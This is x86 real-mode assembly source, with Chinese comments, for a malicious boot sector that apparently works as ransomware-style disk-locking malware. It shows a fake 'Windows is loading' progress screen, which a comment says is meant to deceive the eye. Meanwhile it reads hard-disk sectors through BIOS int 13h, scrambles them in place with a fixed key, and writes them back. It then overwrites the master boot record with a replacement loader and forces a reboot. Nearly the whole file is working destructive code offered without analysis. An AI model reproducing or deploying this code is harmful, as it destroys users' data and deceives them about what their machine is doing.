bits 16              ; 编译器选项，编译为.bin文件

mov ah, 0x00        ; 改变视频模式 | AH在10h中断中用作改变模式和功能的值
mov al, 0x03        ; 改变视频模式标志 [模式号]，将屏幕模式改为640x200
int 0x10            ; 调用10h中断

mov ah, 0x0B        ; 设置调色板选项 | AH在10h中断中用作改变模式和功能的值
mov bh, 0x00        ; 设置背景色为黑色
int 0x10            ; 调用10h中断

jmp showFakeBanner ; 跳转到'showFakeBanner'函数地址

showFakeBanner: ; 函数 '展示假横幅'
    mov cx, 2607h               ;设置光标位置为2607h
    mov ah, 01h                 ;设置光标显示
    mov bh, 0                   ;设置页面号为0
    int 10h

    mov dh, 0                   ;光标位置行
    mov dl, 0                   ;光标位置列
    mov ah, 02h                 ;设置光标位置
    mov bh, 0                   ;设置页面号为0
    int 10h                     ;将光标移到前一列

    mov bh, 0x07                ;背景颜色
    call ClearScreen

    mov si, msg1
    call print_str

    mov bp, 0200h
    call write_char

    mov ah, 03h
    mov bh, 0
    int 10h

    mov [CURSOR_LINE], dh       ;保存光标位置行
    mov [CUSROR_COL], dl        ;保存光标位置列

next:
    mov dh, [CURSOR_LINE]       ;光标位置行
    mov dl, [CUSROR_COL]        ;光标位置列
    mov ah, 02h                 ;设置光标位置
    mov bh, 0                   ;设置页面号为0
    int 10h

    mov eax, [NUMBERS]
    add eax, 2048               ;将值增加2048
    mov [NUMBERS], eax          ;将最终值存储在NUMBERS中

    mov di, strbuf              ;ES:DI指向用于存储的字符串缓冲区
    call uint32_to_str          ;将EAX中的32位无符号值转换为ASCII字符串
    mov si, di                  ;DS:SI指向要打印的字符串缓冲区
    call print_str

    mov si, msg2
    call print_str

    mov eax, [NUMBERS]
    cmp eax,114514191        ;只执行到114514191 ，用于欺骗眼睛
    jl next                     ;继续循环直到达到限制
    jmp driveEncrypt ; 跳转到'driveEncrypt'函数地址 此时才进行真正的加密
;=====================================================================================================================

ClearScreen:
    mov ah, 07h                 ;调用的功能号
    mov al, 0h                  ;滚动整个窗口
    mov cx, 0h                  ;行 0，列 0
    mov dx, 184fh
    int 10h
    ret


write_char:
    mov ah,0eh
    mov si,0ffffh
    inc si
.charloop:
    push bp
    mov al, [byte ds:bp + si]
    mov bx, 07h
    int 10h                     ;将字符输出到屏幕
    pop bp
    inc si
    cmp byte [ds:bp + si],0     ;继续写入直到遇到空字符
    jnz .charloop
    ret


print_str:
    push ax
    push di
    mov ah,0eh
.getchar:
    lodsb                       ;相当于mov al,[si]和inc si
    test al, al                 ;相当于cmp al,0
    jz .end
    int 10h
    jmp .getchar
.end:
    pop di
    pop ax
    ret


uint32_to_str:
    push edx
    push eax
    push ecx
    push bx
    push di
    xor bx, bx                  ;数字计数
    mov ecx, 10                 ;除数
.digloop:
    xor edx, edx                ;除法使用EDX:EAX作为64位除数
    div ecx                     ;将EDX:EAX除以10；EAX=商；EDX=余数（当前数字）
    add dl, '0'                 ;将数字转换为ASCII码
    push dx                     ;将数字推入栈中，以便在完成后按照相反的顺序弹出
    inc bx                      ;数字计数加1
    test eax, eax
    jnz .digloop                ;如果除数不为零，则继续转换数字
.popdigloop:                    ;从栈中以相反的顺序获取数字
    pop ax
    stosb                       ;相当于mov [ES:DI], al和inc di
    dec bx
    jne .popdigloop             ;直到弹出所有数字为止
    mov al, 0
    stosb                       ;以NUL终止字符串；相当于mov [ES:DI], al和inc di
    pop di
    pop bx
    pop ecx
    pop eax
    pop edx
    ret
;=====================================================================================================================
driveEncrypt: ; 函数 '驱动加密'
    mov ch, 0 ; 设置硬盘柱面计数器

countCylinders: ; 函数 '计算柱面'
    mov dh, 0 ; 设置硬盘磁头计数器

    countHeaders: ; 函数 '计算磁头'
        mov cl, 7 ; 设置起始扇区 [SetFilePointer(硬盘的第七个扇区)]

        countSectors: ; 函数 '计算扇区'
            mov bx, 0x2000 ; 将段地址移至BX寄存器
            mov es, bx ; 将BX -> ES
            mov bx, 0 ; 将空指针内存偏移量移至BX
            mov ah, 0x02 ; 设置函数 '读取' 的13h中断
            mov al, 128 ; 设置函数 '读取多少扇区'
            int 0x13 ; 使用13h中断

            mov bx, 0xE8AC ; 将简单密钥移至BX寄存器
            mov si, 0 ; 将空指针内存偏移量移至SI以计算0x2000段中的偏移量

            countBytes: ; 函数 '计算字节'
                add word [es:si], si ; 将SI计数器的字节从si添加到RAM堆栈0x2000:01,02,02,04...等等中的计数器si | SI[1,2,3,4,5,6...n] => 0x2000:SI[1,2,3,4,5,6...n]
                shl byte [es:si], 4 ; 交换字节
                mov ax, bx ; 将简单密钥移至AX以调用函数 'mul'
                mul byte [es:si] ; 将RAM堆栈0x2000:SI计数器中的字节乘以AX寄存器
                add word [es:si], bx ; 将来自BX寄存器的字（4个字节）添加到堆栈ES:SI [0x2000:SI计数器]
                shr byte [es:si], 2 ; 交换字节
                sub word [es:si], si ; 将SI的4个字节从ES:SI中减去
                mov ax, si ; 将SI计数器的字节移至AX
                mul byte [es:si] ; 将[ES:SI]乘以寄存器AX [标准操作 'mul']
                add word [es:si], dx ; 将4字节从DX添加到ES:SI
                shl byte [es:si], 1 ; 交换字节
                inc si ; 增加SI | SI += 1
                cmp si, 65535 ; 当SI < 65535时...
                jnz countBytes ; 创建循环 | 移至函数 'countBytes'

            mov bx, 0x2000 ; 将0x2000段移至BX寄存器
            mov es, bx ; 将BX -> ES | 将数据从空闲寄存器移至段寄存器
            mov bx, 0 ; 将空指针移至BX
            mov ah, 0x03 ; 设置函数 '写入' 的13h中断
            mov al, 128 ; 设置 '写入多少扇区'
            int 0x13 ; 使用13h中断

        inc cl ; 增加CL | CL += 1
        cmp cl, 1224 ; 当CL < 1224时...
        jnz countSectors ; 创建循环 | 移至函数 'countSectors'

    inc dh ; 增加DH | DH += 1
    cmp dh, 16 ; 当DH < 16时...
    jnz countHeaders ; 创建循环 | 移至函数 'countHeaders'
    inc ch ; 增加CH
    cmp ch, 5 ; 当CH < 5时...
    jnz countCylinders ; 创建循环 | 移至函数 'countCylinders'

jmp readNewLoader ; 跳转到函数 'readNewLoader'

readNewLoader: ; 函数 '读取新的加载器'
    mov bx, 0x8000 ; 将0x8000段移至BX寄存器
    mov es, bx ; 将BX -> ES
    mov bx, 0 ; 将空指针移至BX寄存器
    mov ah, 0x02 ; 设置函数 '读取' 的13h中断
    mov al, 1 ; 设置 '读取多少扇区'
    mov dh, 0 ; 设置硬盘磁头 -> 0
    mov ch, 0 ; 设置硬盘柱面 -> 0
    mov cl, 6 ; 设置起始扇区 | SetFilePointer(硬盘的第一个扇区);
    int 0x13 ; 使用13h中断
    jc readNewLoader ; 如果出错... 重复此函数！
    jmp writeNewLoader ; 如果正常... 跳转到函数 'writeNewLoader'

writeNewLoader: ; 函数 '写入新的加载器'
    mov bx, 0x8000 ; 将0x8000段移至BX
    mov es, bx ; 将BX -> ES
    mov bx, 0 ; 将偏移量设为0x0000在BX中
    mov ah, 0x03 ; 设置函数 '写入' 的13h中断
    mov al, 1 ; 设置 '写入多少扇区'
    mov dh, 0 ; 设置硬盘磁头 -> 0
    mov ch, 0 ; 设置硬盘柱面 -> 0
    mov cl, 1 ; 设置起始扇区 | SetFilePointer(硬盘的第一个扇区);
    int 0x13 ; 使用13h中断
    jc writeNewLoader ; 如果写入错误... 循环！移至函数 'writeNewLoader' 并重新读取
    jmp 0xFFFF:0x0000 ; 跳转到BIOS内存地址 | 重启
MBR_Signature:
    msg1 db 'Windows is loading, please do not shut down, loading progress:', 0  ;提示信息
    msg2 db ' of 3000000000 (', 0  ;消息1
    msg3 db '% It takes about 3 minutes)', 0              ;消息2
    BOOT_DRIVE dd 0             ;引导驱动器
    CURSOR_LINE dd 0           ;光标位置行
    CUSROR_COL dd 0            ;光标位置列
    NUMBERS dd 0               ;数字
    strbuf db 0                ;字符串缓冲区
times 1022-($-$$) db 0  ; 填充剩余的空间
dw 0xAA55             ; 设置引导扇区的结束标记